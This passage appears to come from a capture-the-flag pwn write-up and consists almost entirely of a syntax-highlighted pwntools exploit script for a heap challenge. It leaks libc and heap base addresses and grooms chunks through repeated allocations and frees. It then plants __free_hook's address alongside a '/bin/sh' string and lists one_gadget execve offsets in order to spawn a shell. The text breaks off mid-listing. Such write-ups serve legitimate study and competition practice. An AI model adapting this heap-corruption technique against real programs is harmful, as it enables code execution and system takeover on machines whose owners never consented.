class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x3ec075</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>dele(<span class="hljs-string">&#x27;FK1&#x27;</span>)<br>add(<span class="hljs-number">0x420</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;FK1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x01&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x02&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>show()<br>ru(<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x330</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB0&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x05&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x06&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x70</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM4&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND43&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x07&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x08&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>dele(<span class="hljs-string">&#x27;AB0&#x27;</span>)<br>dele(<span class="hljs-string">&#x27;AB1&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM5&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND5&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x09&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x0a&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x20</span>,tf=<span class="hljs-string">&#x27;n&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB0&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x05&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x06&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># for i in range(3):</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">0</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">2</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">4</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">6</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">8</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">9</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">10</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">11</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">7</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;CC&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">9</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">13</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># add(0x50,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=(&#x27;ZZ&#123;&#125;&#x27;.format(7)).ljust(8,&#x27;\0&#x27;)+(&#x27;XX&#123;&#125;&#x27;.format(5)).ljust(8,&#x27;\0&#x27;)+(&#x27;CW&#123;&#125;&#x27;.format(6)).ljust(8,&#x27;\0&#x27;)+str(p8((5))).ljust(8,&#x27;\0&#x27;)+p8(11).ljust(8,&#x27;\0&#x27;))</span><br><span class="hljs-comment"># for i in range(7-1-i):</span><br><span class="hljs-comment">#     dele(&#x27;ZZ&#123;&#125;&#x27;.format(i))</span><br><br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br><br>dele(<span class="hljs-string">&#x27;AB&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-string">&#x27;CC&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-string">&#x27;AB&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>))<br><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">0</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">2</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">4</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">6</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">8</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">9</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">10</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">11</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">7</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=p64(libc.sym.__free_hook),name=(<span class="hljs-string">&#x27;CC&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">9</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">13</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># add(0x50,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=(&#x27;CC&#123;&#125;&#x27;.format(0)).ljust(8,&#x27;\0&#x27;)+(&#x27;SW&#123;&#125;&#x27;.format(8)).ljust(8,&#x27;\0&#x27;)+(&#x27;AD&#123;&#125;&#x27;.format(6)).ljust(8,&#x27;\0&#x27;)+str(p8((9))).ljust(4,&#x27;\0&#x27;)+p8(13).ljust(8,&#x27;\0&#x27;))</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;FF&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">1</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">13</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;FF&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">2</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>og = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == 